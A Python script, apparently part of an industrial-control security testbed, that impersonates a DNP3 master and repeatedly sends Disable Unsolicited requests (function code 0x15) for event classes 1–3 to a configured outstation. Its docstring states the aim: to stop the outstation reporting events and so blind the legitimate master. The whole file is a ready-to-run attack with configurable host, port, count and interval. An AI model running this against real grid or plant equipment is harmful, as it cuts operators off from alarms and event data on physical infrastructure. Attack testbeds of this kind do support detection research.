"""DISABLE_UNSOLICITED — FC 0x15 against classes 1/2/3.

Unauthorized master tells the outstation to stop emitting unsolicited
event responses, blinding the legitimate master.
"""
import argparse, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from dnp3 import app_request, send_tcp, now
from config import OUTSTATION_IP, OUTSTATION_PORT, OUTSTATION_ADDR, MASTER_ADDR

OBJ = b"\x3C\x02\x06" + b"\x3C\x03\x06" + b"\x3C\x04\x06"   # classes 1,2,3

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default=OUTSTATION_IP)
    p.add_argument("--port", type=int, default=OUTSTATION_PORT)
    p.add_argument("--count", type=int, default=20)
    p.add_argument("--interval", type=float, default=1.0)
    a = p.parse_args()
    print(f"[{now()}] DISABLE_UNSOLICITED start x{a.count}")
    for i in range(a.count):
        send_tcp(app_request(MASTER_ADDR, OUTSTATION_ADDR, 0x15, OBJ, seq=i & 0x0F),
                 a.host, a.port)
        time.sleep(a.interval)
    print(f"[{now()}] DISABLE_UNSOLICITED stop")

if __name__ == "__main__":
    main()
